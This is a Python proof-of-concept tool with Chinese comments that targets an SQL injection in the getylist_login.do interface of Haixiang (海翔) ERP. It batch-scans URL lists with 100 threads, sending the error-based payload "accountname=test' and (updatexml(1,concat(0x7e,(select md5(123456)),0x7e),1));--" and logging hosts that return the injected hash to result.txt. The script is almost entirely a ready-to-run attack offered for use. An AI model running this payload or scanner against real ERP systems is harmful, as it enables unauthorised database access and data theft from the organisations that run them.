#海翔ERP getylist_login 接口SQL注入漏洞

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

def banner():
    text = '''

   ▄████████ ████████▄    ▄█             ▄█  ███▄▄▄▄        ▄█    ▄████████  ▄████████     ███      ▄█   ▄██████▄  ███▄▄▄▄   
  ███    ███ ███    ███  ███            ███  ███▀▀▀██▄     ███   ███    ███ ███    ███ ▀█████████▄ ███  ███    ███ ███▀▀▀██▄ 
  ███    █▀  ███    ███  ███            ███▌ ███   ███     ███   ███    █▀  ███    █▀     ▀███▀▀██ ███▌ ███    ███ ███   ███ 
  ███        ███    ███  ███            ███▌ ███   ███     ███  ▄███▄▄▄     ███            ███   ▀ ███▌ ███    ███ ███   ███ 
▀███████████ ███    ███  ███            ███▌ ███   ███     ███ ▀▀███▀▀▀     ███            ███     ███▌ ███    ███ ███   ███ 
         ███ ███    ███  ███            ███  ███   ███     ███   ███    █▄  ███    █▄      ███     ███  ███    ███ ███   ███ 
   ▄█    ███ ███  ▀ ███  ███▌    ▄      ███  ███   ███     ███   ███    ███ ███    ███     ███     ███  ███    ███ ███   ███ 
 ▄████████▀   ▀██████▀▄█ █████▄▄██      █▀    ▀█   █▀  █▄ ▄███   ██████████ ████████▀     ▄████▀   █▀    ▀██████▀   ▀█   █▀  
                         ▀                             ▀▀▀▀▀▀                                                                
                                                                     version:HX_ERP_sql 1.0
'''
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description="海翔ERP getylist_login 接口SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your link")
    parser.add_argument('-f','--file',dest='file',type=str,help="file path")
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        #处理数据，加线程
        url_list=[]
        with open('url.txt','r',encoding='utf-8') as fp:
            for i in fp.readlines():
                i = i.strip()
                if 'https://' in i:
                    url_list.append(i)
                else:
                    i = 'http://' + i
                    url_list.append(i)
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")   

def poc(target):
    url_payload = '/getylist_login.do'
    url = target + url_payload
    # print(url)
    headers = {
            "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Content-Type":"application/x-www-form-urlencoded"
        }
    data = "accountname=test' and (updatexml(1,concat(0x7e,(select md5(123456)),0x7e),1));--"

    try:
        response = requests.post(url=url,headers=headers,data=data,timeout=5,verify=False)
        # print(response.text) 
        if response.status_code == 500 and "e10adc3949ba59abbe56e057f20f883" in response.text:
            print( f"{GREEN}[+] {url} 存在sql注入漏洞{RESET}")
            with open('result.txt','a')as f:
                f.write(target+'\n')
        else:
            print("[-] 漏洞不存在!!")
    except Exception:
        pass
if __name__ == '__main__':
    main()
